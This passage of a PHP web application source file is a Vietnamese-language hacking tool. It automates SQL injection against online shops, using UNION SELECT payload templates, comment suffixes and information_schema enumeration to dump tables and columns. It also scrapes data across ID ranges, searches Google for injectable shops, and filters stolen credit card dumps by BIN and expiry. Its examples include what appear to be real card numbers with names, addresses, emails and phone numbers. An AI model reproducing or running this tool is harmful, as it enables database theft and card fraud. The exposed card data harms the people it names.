					<INPUT TYPE=RADIO CLASS=checkbox NAME="lienketchuoi" VALUE="3" <?php if($_POST["kieuquery"]==1)echo "checked" ?>				> Liên kết bằng hàm concat <i>(VD: <b>'abc'</b> sẽ được chuyển thành <b>concat(char(97),char(98),char(99))</b>)</i><br>
					<h4>Cách lấy cột thứ <b>n+1</b> của bảng <b>table</b>:</h4>
					<INPUT TYPE=RADIO CLASS=checkbox NAME="cselect" VALUE="<?php echo _S2_($gcolumnstring[0]); ?>" <?php if($_POST["kieuquery"]==2)echo "checked" ?> > SELECT TOP 1 column FROM table WHERE column not in(&lt;danh sách n column trước&gt;) ORDER BY column<br>
					<INPUT TYPE=RADIO CLASS=checkbox NAME="cselect" VALUE="<?php echo _S2_($gcolumnstring[1]); ?>"         > SELECT TOP 1 column FROM table WHERE column not in(SELECT TOP n column FROM table ORDER BY column) ORDER BY column<br>
					<INPUT TYPE=RADIO CLASS=checkbox NAME="cselect" VALUE="<?php echo _S2_($gcolumnstring[2]); ?>"         > SELECT TOP 1 column FROM table WHERE column!=&lt;column trước&gt; and column!=&lt;column trước nữa&gt;... ORDER BY column<br>
					<INPUT TYPE=RADIO CLASS=checkbox NAME="cselect" VALUE="<?php echo _S2_($gcolumnstring[3]); ?>"         > SELECT TOP 1 column FROM table WHERE column>&lt;column trước&gt; ORDER BY column<br>
					<INPUT TYPE=RADIO CLASS=checkbox NAME="cselect" VALUE="<?php echo _S2_($gcolumnstring[4]); ?>"         > SELECT column FROM table ORDER BY column LIMIT n,1<br>
					<?php if($_POST["kieuquery"]==1){ ?>
					<INPUT TYPE=RADIO CLASS=checkbox NAME="cselect" VALUE="UNION ALL SELECT <?php echo $c;?>{SCOLUMN}<?php echo $d;?> FROM {TABLE} WHERE {COND} {1};;COLLIST/|/|and {COLUMN}!=/| and  {COLUMN}!=/| " checked > UNION ALL (SELECT <?php echo $c;?>column<?php echo $d;?> FROM table WHERE column!=&lt;column trước&gt; and column!=&lt;column trước nữa&gt;...)<br>
					<?php }; ?>
					<h4>Cách injection:</h4>
					<?php for($i=0;$i<count($iwaystring);$i++) echo '<INPUT TYPE=RADIO CLASS=checkbox NAME="iway" VALUE="'.(urlstring($url,$urlid,_S2_($iwaystring[$i]["s"]))).'" '.(($iwaystring[$i]["c"]==$_POST["kieuquery"])?'checked':'').'> '.urlstring($url,$urlid,$iwaystring[$i]["s"]).'<br>'; ?>
					Xâu thêm vào phía sau query: <input name=xs type=text value="<?php if($_POST["kieuquery"]==1) echo "/*"; elseif($_POST["kieuquery"]==2) echo "--sp_password";?>"  style='width:20%;' ><br>
					<h4>Tên các  column và table:</h4>
					<font size=-1>
						<list>
							<!--<li>Bạn hãy sử dụng dấu <font color=red>:</font> (2 chấm) như phép toán hợp 2 chuỗi.</li>
								&nbsp;<i>VD:</i> Nếu database đầu tiên là <u>vanhoa_shop</u>, table đầu tiên của database đó là <u>shop_admin</u>, thì kết quả của lệnh<br>
								&nbsp;<b>select top 1 <i>table_schema:char(46):table_name</i> from information_schema.tables</b><br>
								&nbsp;sẽ cho kết quả là vanhoa_shop.shop_admin (ở đây table_schema:char(46):table_name không phải là đoạn lệng của sql mà chỉ là cách biểu diễn chuỗi bạn nhập)-->
						</list>
					</font><br>
					Column ghi tên table là <input name=table_name type=text value="table_name" size=40 > và table chứa danh sách table là <input name=table_list type=text value="information_schema.tables" size=40 ><br>
					Column ghi tên column là <input name=column_name type=text value="column_name" size=38 > và table chứa danh sách column là <input name=column_list type=text value="information_schema.columns" size=40 ><br>

					<br><input type=button onClick='DoSendRequest("sqlinjection2","sqlinjection2","gettable");return false;' value="Lấy table">
					<!--&nbsp<input type=button onClick='DoSendRequest("sqlinjection2","sqlinjection2_2","serverinfo");return false;' value="Xem thông tin server">-->
					&nbsp<input type=button onClick='DoSendRequest("sqlinjection2","sqlinjection2","makequery");return false;' value="Tạo query">
				</form>
				<div name="div_sqlinjection2_2" id="div_sqlinjection2_2"></div>
				<div name="div_sqlinjection2" id="div_sqlinjection2"></div>
				<?php
				break;
			case "serverinfo":
				?>
				Thông tin server của site <?php echo _S3_($_POST["url"]); ?>:
				<?php
				break;
			case "gettable":
				$_POST["table_name"]=GetStringQuery2(split(":",$_POST["table_name"]),$_POST["bieudienchuoi"],$_POST["lienketchuoi"],$_POST["kieuquery"]!="1");
				$_POST["column_name"]=GetStringQuery2(split(":",$_POST["column_name"]),$_POST["bieudienchuoi"],$_POST["lienketchuoi"],$_POST["kieuquery"]!="1");
				$tables=GetColumnsList($_POST["table_name"],$_POST["table_list"],$_POST["url"],$_POST["cselect"],$_POST["bieudienchuoi"],$_POST["lienketchuoi"],$_POST["xs"],$_POST["iway"],$_POST["kieuquery"]!="1");
				?>
				<form onSubmit="return false;" name="frm_sqlinjection_gettable">
					<input TYPE=hidden NAME="step" VALUE="getcolumn">
					<?php echo form_hidden_param(Array("url","kieuquery","action","bieudienchuoi","lienketchuoi","cselect","table_name","table_list","column_name","column_list","xs","iway")); ?>
					<h4>Danh sách table:</h4>
					<?php showlistbox( $tables,'\"',"tables");?>
					<BR><input type=button onClick='DoSendRequest("sqlinjection_gettable");return false;' value="Lấy column">
				</form>
				<div name="div_sqlinjection_gettable" id="div_sqlinjection_gettable"></div>
				<?php		
				unset($tables);	
				break;
			case "getcolumn":
				$tables=split(",:,",$_POST["tables"]);
				?>
				<form onSubmit="return false;" name="frm_sqlinjection_getcolumn">
					<input TYPE=hidden NAME="step" VALUE="makequery">
					<?php echo form_hidden_param(Array("url","tables","kieuquery","action","bieudienchuoi","lienketchuoi","cselect","table_name","table_list","column_name","column_list","xs","iway")); ?>
					<?php for($i=0;$i<count($tables);$i++){ ?>
						<h4>Danh sách columns của table <i><u><?php echo $tables[$i] ?></u></i>:</h4>
						<?php
							$cond="table_name=".GetStringQuery($tables[$i],"","",$_POST["bieudienchuoi"],$_POST["lienketchuoi"]);
							showlistbox(GetColumnsList($_POST["column_name"],$_POST["column_list"],$_POST["url"],$_POST["cselect"],$_POST["bieudienchuoi"],$_POST["lienketchuoi"],$_POST["xs"],$_POST["iway"],$_POST["kieuquery"]!="1",$cond),'\"',"tables_".$i);
						?>
					<?php } ?>
					<BR><input type=button onClick='DoSendRequest("sqlinjection_getcolumn");return false;' value="Tạo query">
				</form>
				<div name="div_sqlinjection_getcolumn" id="div_sqlinjection_getcolumn"></div>
				<?php		
				unset($tables);
				break;
			case "makequery":
				$_POST["cselect"]=makecselect($_POST["cselect"]);
				if($_POST["tables"]){
					$tables=split(",:,",$_POST["tables"]);
					$column="";$table="";
					for($i=0;$i<count($tables);$i++){
						if($i>0) {$table.="\n";$column.="\n";}
						if($_POST["tables_".$i]) $column.="A".$i.".".str_replace(",:,","\nA".$i.".",$_POST["tables_".$i]);
						$table.=$tables[$i]." : A".$i;
					}
				};
				?>
				<form onSubmit="return false;" name="frm_sqlinjection_makequery">
					<input TYPE=hidden NAME="step" VALUE="editquery">
					<?php echo form_hidden_param(Array("url","kieuquery","action","bieudienchuoi","lienketchuoi","cselect","table_name","table_list","column_name","column_list","xs","iway")); ?>
						<h4>Bạn hãy sắp xếp lại thứ tự các column:</h4>
						<textarea name=columns style="width:40%;overflow:scroll;" rows=10><?php echo $column; ?></textarea>
						 với 
						<textarea name=tables style="width:40%;overflow:scroll;" rows=10><?php echo $table; ?></textarea><br>
					<BR><input type=button onClick='DoSendRequest("sqlinjection_makequery");return false;' value="Sửa cách query">
				</form>
				<div name="div_sqlinjection_makequery" id="div_sqlinjection_makequery"></div>
				<?php
				break;
			case "editquery":
			{
				$_POST["cselect"].=" {WHERE_AND_ORDER}";
				$table=str_replace("\r","\n",$_POST["tables"]);
				$table=str_replace("\r","\n",$table);
				$table=str_replace("\n\n","\n",$table);
				$table=trim($table);
				$table=str_replace("\n",",",$table);
				$table=str_replace(":"," as ",$table);
				$table=str_replace("  "," ",$table);
				$column=str_replace("\r","\n",$_POST["columns"]);
				$column=str_replace("\n\n","\n",$column);
				$column=trim($column);
				$column=split("\n",$column);
				$q=GDoQRY($column,$table,$_POST["url"],$_POST["cselect"],$_POST["bieudienchuoi"],$_POST["lienketchuoi"],$_POST["xs"],$_POST["iway"],$_POST["kieuquery"]!="1");
				?>
				<form onSubmit="return false;" name="frm_sqlinjection_ediquery">
					<input TYPE=hidden NAME="step" VALUE="runquery">
					<?php echo form_hidden_param(Array("action")); ?>
					<h4>Lấy thông tin từ địa chỉ </h4>
					<textarea style="width:100%" rows=4 name=q value=""><?php echo $q; ?></textarea><br>
					<i>Trong địa chỉ trên, xâu <b>{WHERE_AND_ORDER}</b> sẽ được thay thế bởi lệnh điều kiện, các lệnh xếp thứ tự (hay các lệnh sau FROM).</i>
					<h4>Thực hiện lấy dữ liệu với điều kiện (điều kiện này sẽ thay thế {WHERE_AND_ORDER} ở trên):</h4>
					<input type=text name='cond' value='' style='width:80%;'><br>
					<input type=checkbox name='useii'>Sử dụng biến chạy <b>($_i_)</b> (VD: <b>where id=($_i_)</b>) với <b>($_i_)</b> nhận các giá trị từ
					<input type=text name='ifrom' value='0' size=20> đến 
					<input type=text name='ito' value='100' size=20><br>
					<BR><input type=button onClick='DoSendRequest("sqlinjection_ediquery");return false;' value="Thực hiện query">
				</form>
				<div name="div_sqlinjection_ediquery" id="div_sqlinjection_ediquery"></div>
				<?php
				break;
			}
			case "runquery":{
				echo "<h4>Kết quả ^_^</h4>";
				$q=$_POST["q"];$q=str_replace("{WHERE_AND_ORDER}",$_POST["cond"],$q);
				if($_POST["useii"]=="false") $_POST["ifrom"]=$_POST["ito"]=1;
				global $cfm_dtpos;
				$result = DoQry($q,$_POST["ifrom"],$_POST["ito"],$cfm_dtpos["open"],$cfm_dtpos["close"],"");
				echo "<center><a href='javascript:getObj(\"oid\").focus();getObj(\"oid\").select();'>Chọn tất cả</a><br><textarea rows=10 style='width:90%' id=oid style='border:dotted 1 red;overflow:scroll;'>";
				echo $result;
				echo "</textarea></center><br>";
				echo "<center><br><textarea style='width: 505px;' rows=2 onClick='this.select();return false;' readonly>".$q."</textarea></center>";
				break;
			}
			default:
				PInvalid();
		}
		unset($gcolumnstring);
	}
	function AUTO_URL(){
		global $_POST;
		switch($_POST["step"])
		{
			case "buoc1":
				?>
				<form action=post onSubmit='return false;' name=frm_form3_0>
					<?php echo form_hidden_param(Array("action")); ?>
					<input type=hidden name=step value='run'>
					Địa chỉ: <input type=text name=url1 value='' style='width:80%'><br>
					Lấy chuỗi với tiền tố <input name=prefix type=text value="value '" size=20 onchange="document.frm_form3_0.form3_0_submit.disabled=(document.frm_form3_0.prefix.value=='')||(document.frm_form3_0.suffix.value=='')" onkeyup="document.frm_form3_0.form3_0_submit.disabled=(document.frm_form3_0.prefix.value=='')||(document.frm_form3_0.suffix.value=='')" onblur="document.frm_form3_0.form3_0_submit.disabled=(document.frm_form3_0.prefix.value=='')||(document.frm_form3_0.suffix.value=='')"> và hậu tố <input name=suffix type=text value="' to" size=20 onchange="document.frm_form3_0.form3_0_submit.disabled=(document.frm_form3_0.prefix.value=='')||(document.frm_form3_0.suffix.value=='')" onkeyup="document.frm_form3_0.form3_0_submit.disabled=(document.frm_form3_0.prefix.value=='')||(document.frm_form3_0.suffix.value=='')" onblur="document.frm_form3_0.form3_0_submit.disabled=(document.frm_form3_0.prefix.value=='')||(document.frm_form3_0.suffix.value=='')">.<br>
					Không lấy chuỗi có chứa  <input name=include type=text value='' size=20 >.<br>
					<i>VD, để khai thác bằng lỗi sql injection của shop cfm, với một số shop bạn có thể nhập tiền tố là <b>value '</b> và hậu tố là <b>' to</b>, bạn nên nhớ rằng ký tự hiển thị trên web là <b>&quot;</b> thì nó có thể là <b>&amp;quot;</b>,... (bạn nên view source của trang lỗi để quyết định 2 giá trị này ;))</i><br>
					<input type=checkbox name="BienChay"> Sử dụng biến chạy <b>($_i_)</b> với <b>($_i_)</b> nhận các giá trị từ
					<input type=text name='ifrom' value='1234' size=20 onchange='document.frm_form3_0.form3_0_submit.disabled=!(CheckN(document.frm_form3_0.ifrom.value,9999999999)&&CheckN(document.frm_form3_0.ito.value,9999999999))' onkeyup='document.frm_form3_0.form3_0_submit.disabled=!(CheckN(document.frm_form3_0.ifrom.value,9999999999)&&CheckN(document.frm_form3_0.ito.value,9999999999))' onblur='document.frm_form3_0.form3_0_submit.disabled=!(CheckN(document.frm_form3_0.ifrom.value,9999999999)&&CheckN(document.frm_form3_0.ito.value,9999999999))' > đến 
					<input type=text name='ito' value='1000' size=20 onchange='document.frm_form3_0.form3_0_submit.disabled=!(CheckN(document.frm_form3_0.ifrom.value,9999999999)&&CheckN(document.frm_form3_0.ito.value,9999999999))' onkeyup='document.frm_form3_0.form3_0_submit.disabled=!(CheckN(document.frm_form3_0.ifrom.value,9999999999)&&CheckN(document.frm_form3_0.ito.value,9999999999))' onblur='document.frm_form3_0.form3_0_submit.disabled=!(CheckN(document.frm_form3_0.ifrom.value,9999999999)&&CheckN(document.frm_form3_0.ito.value,9999999999))' ><br>
				<input type=button id=form3_0_submit name=form3_0_submit onClick='DoSendRequest("form3_0");return false;' value='Start!'>
				</form>
				<div id='div_form3_0'></div>
				<?php
				break;
			case "run":
				$url=$_POST["url1"];
				echo "<center><a href='javascript:getObj(\"oid\").focus();getObj(\"oid\").select();'>Chọn tất cả</a><br><textarea rows=10 style='width:90%' id=oid style='border:dotted 1 red;overflow:scroll;'>";
				if($_POST["BienChay"]=="false") $_POST["ifrom"]=$_POST["ito"]=1;
				$d=(($_POST["ito"]>$_POST["ifrom"])==0)?-1:1;
				$cou=0;
				for($i=$_POST["ifrom"];;$i+=$d)
				{
					if($cou++>50000) break;
					$surl=str_replace("(\$_i_)","".$i,$url);
					$s=DownloadSite($surl);
						if(($o1=strpos($s,$_POST["prefix"]))===false){
							if($i==$_POST["ito"]) break;
							continue;
						}
						$o1+=strlen($_POST["prefix"]);
						$o2=strpos($s,$_POST["suffix"])-$o1;
						if($_POST["include"]!=""){
							if(strpos($lastcolumnname,$_POST["include"])===false) echo substr($s,$o1,$o2)."\n";
						}else echo substr($s,$o1,$o2)."\n";
						if($i==$_POST["ito"]) break;
				}
				echo "</textarea></center><br>";
				break;
			default:
				echo "<b>Lỗi:</b> <font color=red><i>post data không hợp lệ!</i></font>";
				break;
		}
		exit;
	}
	function CC_Search_BIN_EXP(){
		?>
		<h4>Bạn hãy nhập danh sách thẻ (mỗi thẻ 1 dòng):</h4><br>
		<form id=frm_Search_cc onsubmit='return false;'>
			<textarea style="width:90%" rows=10 name=cc></textarea><br>
			<i><font color=red>Tất cả việc kiểm tra đều sử dụng JavaScript và tất cả đều được thực hiện trên máy bạn</font></i><br>
			<h4>Tùy chọn:</h4>
			Bin của thẻ cần tìm (không điền có nghĩa là ko tìm, có thể nhập nhiều bin, cách nhau bởi <b>;</b> ) <input type=text value="| 4123" name=bin size=40 align=center><br>
			<i>VD nếu bạn muốn tìm thẻ có số bin 4123:<br>
				-Nếu bạn tìm thẻ dạng <b>4121340009981636|01|09|765|Mary L. Archambault|600 Fairview Terrace|Williamsport|PA|17701|US|5703237337|Mary Lou Archambault|600 Fairview Terrace|Williamsport|PA|17701|US|20061201080908-19633|72.70.200.240|1001165707||17.006</chargetota l><tax>0</tax><shipping>9.016</shipping><subtotal> 7.99|#122184|</b> (số thẻ ở đầu mỗi dòng) thì bạn hãy nhập là <b>4123</b><br>
				-Nếu bạn tìm thẻ dạng <b>| 32 | 4003901001482007 | JAMES H STEVENSON | Jun 1 2008 12:00AM | 216 | Jim | Stevenson | Mayda and Sons Mech. | 9435 Provost Rd NW #202 | | Silverdale | WA | 98383 | 360-692-9003 | jim@maydallc.com</b> thì bạn hãy nhập là <b>| 4123</b><br>
				-Nếu bạn tìm thẻ dạng <b>2654/ami.cindric@gmail.com/Nov 22 2007 1:50PM/Ami Cindric/7802 Briarwood Dr.//Franklin/WI/53132//Visa/4480320000056468/04/2009</b> thì bạn hãy nhập là <b>/4123</b><br>
			</i><br>
			Thời gian hết hạn của thẻ cần tìm (không điền có nghĩa là ko tìm, có thể nhập nhiều date, cách nhau bởi <b>;</b> ) <input type=text value="05 | 2008" name=expdate size=40 align=center><br>
			<i>VD nếu bạn muốn tìm thẻ có số ngày hết hạn là 2/2010, bạn có thể nhập <b>| 2/2010;|2/2010;/2/2010;02/2010;Feb 2010</b>...
			</i><br>
			<input type=button onClick='DoSearchCC("div_Search_cc_result",getObj("frm_Search_cc").cc.innerHTML||getObj("frm_Search_cc").cc.value,getObj("frm_Search_cc").bin.value,getObj("frm_Search_cc").expdate.value);return false;' value="Tìm">
		</form>
		<div name=div_Search_cc_result id=div_Search_cc_result></div>
		<?php
		exit;
	}
	function SearchGoogle(){
		global $_POST;
		switch($_POST["step"])
		{
			case "buoc1":
				?>
				<form method=post action="" target=div_form_google_0 name=frm_form_google_0>
					<?php echo form_hidden_param(Array("action")); ?>
					<input type=hidden name=step value='run'>
					Từ khóa: <input type=text name=key value='' style='width:80%'><br>
					Xâu thêm vào sau id để xác định lỗi: <input type=text name=suffix value="'" size=30><br>
					Nếu sau khi thêm xâu trên, một site là có lỗi nếu xuất hiện một trong những xâu sau:<br>
					<textarea rows=10 style="width:80%" name=errors_mesg>is not a valid MySQL result
Error Executing Database Query
[Macromedia][SQLServer JDBC Driver][SQLServer]
[Microsoft][ODBC SQL Server Driver][SQL Server]</textarea><br>
				<font size=-1><i>* <b>[Lưu ý]</b> việc tìm kiếm shop thực hiện bằng JavaScript trên chính trình duyệt của bạn.</i></font><br>
				<input type=submit id=form_google_0_submit name=form_google_0_submit  value='Tìm!'>
				</form>
				<iframe id=div_form_google_0 name=div_form_google_0></div>
				<?php
				break;
			case "run":
				$key=$_POST["key"];
				$infinished=true;
				$arr_links=Array();
				$injected_links=Array();
				$i=0;$ns=0;$ni=0;
				while($infinished){
					$url="http://www.google.com/search?hl=en&rls=com.microsoft%3Aen-US&q=".urlencode($key)."&btnG=Search&start=$i&sa=N";
					$source=DownloadSite($url);
					if($infinished=preg_match_all('|<a href="(http://[^"]*)" class=l onmousedown="return clk(this.href,\'(.*)\',\'(.*)\',\'(.*)\',\'(.*)\',\'(.*)\')"|i',$source,$regs)){
						echo $gkey=preg_match_all('|&ei=([^"]*)|i',$source,$regs2);
						if($gkey!=1){
							die("Có lỗi xảy ra... gkey=$gkey...");
						} else {
							$gkey=$regs2[1][0];
							echo "<pre>";
							var_dump($regs);
							echo "</pre>";
							/*for ($count=0;$count < $infinished;$count++){
								$injected_links[$ns++]=$regs[1][$count];
								echo "('".$injected_links[$ns]."')"
								.$regs[3][$count]." - "
								.$regs[4][$count]." - "
								.$regs[5][$count]." - "
								.$regs[6][$count]." - "
								.$regs[7][$count]." - "
								."<br>;";
								flush;
							}*/
						}
						$i+=10;break;
					}
					break;
				};
				break;
			default:
				echo "<b>Lỗi:</b> <font color=red><i>post data không hợp lệ!</i></font>";
				break;
		}
		exit;
	}
	/*=============*/
	$config_style="body{margin: 10pt; ".($_POST["iframe"]!=1?"background: url('?simg=hackerlitebyvanhoa.png')":"")."/*?simg=bg.gif*/;  background-attachment: fixed; background-repeat:no-repeat;background-position:top right;background-color: #F0FCE9;color: #0F0317; scrollbar-arrow-color: #ff9900; scrollbar-track-color: #F0FCE9; scrollbar-face-color: #ffeac0; scrollbar-highlight-color: #ffeac0; scrollbar-3dlight-color: #ff9900; scrollbar-darkshadow-color:#ff9900; scrollbar-shadow-color: #ff9900; }
			 A {cursor: hand; FILTER: progid:dximagetransform.microsoft.barn(duration=1); HEIGHT: 1px;}
			 A:link{text-decoration: none; color:#972FFF; cursor: hand; font-weight:none;}
			 A:visited{text-decoration: none; color:#972FFF; cursor: hand; font-weight:none;}
			 A:active{text-decoration: none; color:#972FFF; cursor: hand; font-weight:none;}
			 A:hover{color:#972FFF; text-decoration: underline overline; border-bottom: 1px dotted #972FFF;}
			 input, textarea, select{/*background: transparent;*/background-color:#ddf8cc; font-family: Tahoma,Verdanda; color: darkgreen; border-style: dotted; border-color: #80c65a; border-width: 1px; }
			 input.checkbox{border:none;background: transparent;}
			 /*{font-family: Tahoma,Verdanda; font-size: 11px; color: #972FFF;}*/
			 iframe {width:100%;border: 0px;}
			 hr {border: 1px dotted darkgreen;text-align:center;width:50%;}
			 .gtext{font-size:13px; font-family: Tahoma,Verdanda; color:#309E62; font-weight:bold; padding-top:5px; background-color:transparent; /*background-image:url('header.gif');*/background-repeat: no-repeat; border-style:none; text-transform:uppercase; letter-spacing:2px; text-align:left; }
			 .error{letter-spacing:1px; text-align:left;color:red;}";
	if(isset($_POST["action"])){
		DecodePostData();
		if($_POST["iframe"]==1) 
			echo "<html><head><meta http-equiv='Content-Type' content='text/html; charset=UTF-8' /><style>".$config_style."</style></head><body>";
		else
			echo "<hr><html><head><meta http-equiv='Content-Type' content='text/html; charset=UTF-8' /></head><body>";
		switch($_POST["action"]){
			case "1":action_SQL_INJECTION();break;
			case "2":AUTO_URL();break;
			case "3":CC_Search_BIN_EXP();break;
			case "4":SearchGoogle();break;
			default: echo $err_postdatakhonghople;break;
		}
		echo "</body></html>";
		exit();
	}
?>
<html>
	<head>
		<title><?php echo $html_title; ?></title>
		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
		<style>
			<?php echo $config_style; ?>
		</style>
		<script type="text/javascript" language="JavaScript">
			var loadingText="<center><font size=+0><img src='?simg=progress.gif'> Đang thực hiện <img src='?simg=progress.gif'></font></center>";
			var _ajax;
			var current_url = '';
			var c_act="none";
			var timmerx=0,timmerxt=10;
			function createXMLHttpRequest(){
				var xmlHttp=null;
				try{
					xmlHttp=new XMLHttpRequest()
				}catch (e){
					try{
						xmlHttp=new ActiveXObject("Msxml2.XMLHTTP")
					}catch (e){
						try{
							xmlHttp=new ActiveXObject("Microsoft.XMLHTTP")
						}catch (e){
							return null
						}
					}
				};
				return xmlHttp
			};
			function preloadImages() { var d=document; if(d.images){ if(!d.IWS_p) d.IWS_p=new Array();var i,j=d.IWS_p.length,a=preloadImages.arguments; for(i=0; i<a.length; i++)if (a[i].indexOf("#")!=0){ d.IWS_p[j]=new Image; d.IWS_p[j++].src=a[i];}}}(Array('http://legendwindz.com/progress.gif'))
			function getObj(_obj){
				var _objCursor;
				if(document.all){
					_objCursor=document.all(_obj)
				}else{
					if(document.getElementById){
						_objCursor=document.getElementById(_obj)
					}else{
						_objCursor=false
					}
				};
				return _objCursor
			};
			function ENM(v_sid){return eval("document."+v_sid);}
			function EID(v_sid){return getObj(v_sid);}
			function CheckN(s,nmax)
			{
				if (s.replace(/[0-9]/g,"")==""){
					if(parseInt(s)>=0 && parseInt(s)<=parseInt(nmax))
						return true;
					else return false;
				}
				else return false;
			};
			function obj_setfocus(obj___id)
			{
				//alert(document.body.scrollHeight+";"+document.body.clientHeight+";"+document.body.scrollTop+";"+document.body.scrollTop+document.body.clientHeight);
				if(document.body.scrollHeight==document.body.clientHeight)
				{
					try{
						__OBJ_FOOTER__.focus();
						__OBJ_FOOTER__FF.e.focus();
						//document.body.scrollTop=document.body.scrollHeight;
						eval("s1="+obj___id+".innerHTML;if(!document."+obj___id+"FF) "+obj___id+".innerHTML='<FORM name="+obj___id+"FF style=\"margin-top: 0px; margin-bottom: 0px;\"><INPUT name=e style=\"width: 0px; height: 0px; border-left: #FFFFFF; border-right: #FFFFFF;\"></FORM>'+"+obj___id+".innerHTML;"+obj___id+".focus();document."+obj___id+"FF.e.focus();"+obj___id+".innerHTML=s1;document."+obj___id+"FF=0;");
						eval("s1="+obj___id+".innerHTML;if(!document."+obj___id+"FF) "+obj___id+".innerHTML='<FORM name="+obj___id+"FF style=\"margin-top: 0px; margin-bottom: 0px;\"><INPUT name=e style=\"width: 0px; height: 0px; border-left: #FFFFFF; border-right: #FFFFFF;\"></FORM>'+"+obj___id+".innerHTML;"+obj___id+".focus();document."+obj___id+"FF.e.focus();"+obj___id+".innerHTML=s1;document."+obj___id+"FF=0;");
					}catch(E){}
				}else{
					var vitri_top = getObj(obj___id).offsetTop;
					document.body.scrollTop=vitri_top;
				};
			};
			function scrool_auto() {try{/*document.body.scrollTop=document.body.scrollHeight;*/obj_setfocus("__OBJ_FOOTER__");}catch(E){};}
			function sizetofix(nelem){
				elem=ENM(nelem);
				elem.size=elem.value.length;
			}
			function InitClassInput(nelem){
				elem=ENM(nelem);
				elem.onchange=elem.onkeyup=elem.onblur="sizetofix('"+nelem+"')"
			}
			function DoSendRequest(_fform,dispdiv,step,zxiframe)
			{
				var a=encodeURIComponent||escape;
				fform=eval("document.frm_"+_fform);
				c_act=_fform;
				if(dispdiv) c_act=dispdiv;
				s='nocachemnkmkjhkhknkjsfbnlfds=' + (5 * Math.random() * 1.33)+'&'; if(step) fform.step.value=step;
				for(var x=0; x < fform.elements.length; x++ ){
					var y = fform.elements[x];
					if(y.name){
						if(y.type=="select-multiple")
						{
							s+=y.name+"=";
							for(var z=0;z<y.length;z++){
								if(y.options[z].selected==true) s+=a(y.options[z].value)+",:,";
							}
							s=s.substr(0,s.length-3);
							s+="&";
						}else if(y.type=="checkbox")
							s+=y.name+"="+(y.checked?"true":"false")+"&";
						else if(y.type=="radio")
							{if(y.checked) s+=y.name+"="+a(y.value)+"&";}
						else if(y.type=="textarea")
							s+=y.name+"="+a(y.innerHTML||y.value)+"&";
						else{
							s+=y.name+"="+a(y.value)+"&";
						}
					}
				};
				if(!zxiframe){
					sendRequest(c_act,s);
				}else{
					act=c_act;
					getObj("div_"+act).innerHTML = "<div id=div2_"+act+" style='text-align:center;'></div><iframe name='iframe_"+act+"' id='iframe_"+act+"' src='about:blank' onload='' style='height:40%;'>";
					while(!EID("iframe_"+act));
					fform.target="iframe_"+c_act;
					fform.method="POST";
					//EID('div2_'+act).innerHTML=loadingText;
					//EID("iframe_"+act).onload="EID('div2_"+act+"').innerHTML=''";
					fform.submit();
				}
			}
			function iDoSendRequest(_fform,dispdiv,step)
			{
				DoSendRequest(_fform,dispdiv,step,true)
			}
			function sendRequest(act,param) {
				try{
					_ajax = createXMLHttpRequest();
					if(!_ajax){
						getObj("div_"+act).innerHTML = "Trình duyệt của bạn không hỗ trợ ajax.";
						return;
					}
					getObj("div_"+act).innerHTML = loadingText;
					getObj("div_"+act).style.display = "block";
					_ajax.open('POST',  window.location);
					_ajax.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
					_ajax.onreadystatechange = handleResponse;
					_ajax.send(param);
				}
				catch(e){}
				finally{}
			}
			function handleResponse() {
				try {
					if(_ajax.readyState == 4){
							if(_ajax.status == 200){
								_div="div_"+c_act;
								if(_ajax.responseText.indexOf('#STATUS#')>0){
									_array=_ajax.responseText.split('#');_code=_array[2];_msg=_array[3];
									if(_code=='ERROR'){
										getObj(_div).innerHTML='Không thành công';
									};
									if(_code=='SUCCESS'){
									}
								}else{
									getObj(_div).innerHTML=_ajax.responseText;
									_ajax=null;
								};
							}else{
								if(_ajax.status >= 400){
									getObj(_div).innerHTML='Mất liên lạc với máy chủ'
								};
							}
						_ajax=null;
						}
			  }
				catch(e){}
				//finally{}
			};
			function DoSearchCC(result_div,cc,bin,expdate){
				bin=""+bin;expdate=""+expdate;
				b_Search_bin=(bin!="");b_Search_exp=(expdate!="");
				bin=bin.split(";");expdate=expdate.split(";");
				cc=cc.split("\n");
				s="";
				for(i=0;i<cc.length;i++){
					bf=false||!b_Search_bin;
					if(b_Search_bin) for(j=0;j<bin.length;j++){p=cc[i].indexOf(bin[j]);if(p>-1&&("0"<=bin[1]<="9")||p==0) {bf=true;break;}}
					if(bf) if(b_Search_exp) {bf=false;for(j=0;j<expdate.length;j++) if(cc[i].indexOf(expdate[j])>-1) {bf=true;break;}}
					if(bf) s+=cc[i]+"\n";
				}
				EID(result_div).innerHTML="<center><a href='javascript:getObj(\"oid\").focus();getObj(\"oid\").select();'>Chọn tất cả</a><br><textarea rows=10 style='width:90%' id=oid style='border:dotted 1 red;overflow:scroll;'>"+s+"</textarea></center>"
			}
			function ShowHelp(s){
				return false;
			}
		</script>
	</head>
	<body>
	<h1><?php echo $html_header; ?></h1>
		<form onSubmit="return false;" name="frm_formmain">
			<input TYPE=hidden NAME="step" VALUE="buoc1">
			<p class=gtext>Chào bạn, bạn muốn làm gì?</p>
			<INPUT TYPE=RADIO CLASS=checkbox NAME="action" VALUE="1" checked > Lấy thông tin từ site lỗi sql injection.<BR>
			<INPUT TYPE=RADIO CLASS=checkbox NAME="action" VALUE="2"         > Tự động lấy thông tin từ (những) địa chỉ cho trước.<BR>
			<INPUT TYPE=RADIO CLASS=checkbox NAME="action" VALUE="3"         > Tìm thẻ theo bin và/hoặc tháng năm hết hạn sử dụng.<BR>
			<!--<INPUT TYPE=RADIO CLASS=checkbox NAME="action" VALUE="4"         > Tìm shop lỗi injection.<BR>-->
			<!--<INPUT TYPE=RADIO CLASS=checkbox NAME="action" VALUE="3" disabled> Kiểm tra mỗi cc (cvv) trong list còn sử dụng được hay không.<BR>-->
			<BR><BR><input type=button onClick='DoSendRequest("formmain");return false;' value="Thực hiện">
		</form>
		<div name="div_formmain" id="div_formmain"></div>
		<DIV id=__OBJ_FOOTER__ style='dislay:none;width:100%'></DIV>
		<FORM name=__OBJ_FOOTER__FF style="margin-top: 0px; margin-bottom: 0px;"><INPUT name=e style="width: 0px; height: 0px; border-left: #FFFFFF; border-right: #FFFFFF;"></FORM>
		<!--<b>Change logs:</b><br><font size=1>
		*30/04/2008 - 1.02d : Sửa lỗi không query đc bởi hàm ereg.<br>
		*30/04/2008 - 1.02c : Đây là bản ổn định nhất.<br>
		*30/04/2008 - 1.02b : Sửa lỗi query thiếu table và column.<br>
		*29/04/2008 - 1.02 : Sửa lỗi không query đc một số địa chỉ do ký tự & ở địa chỉ bị đổi thành &amp;amp;.<br>
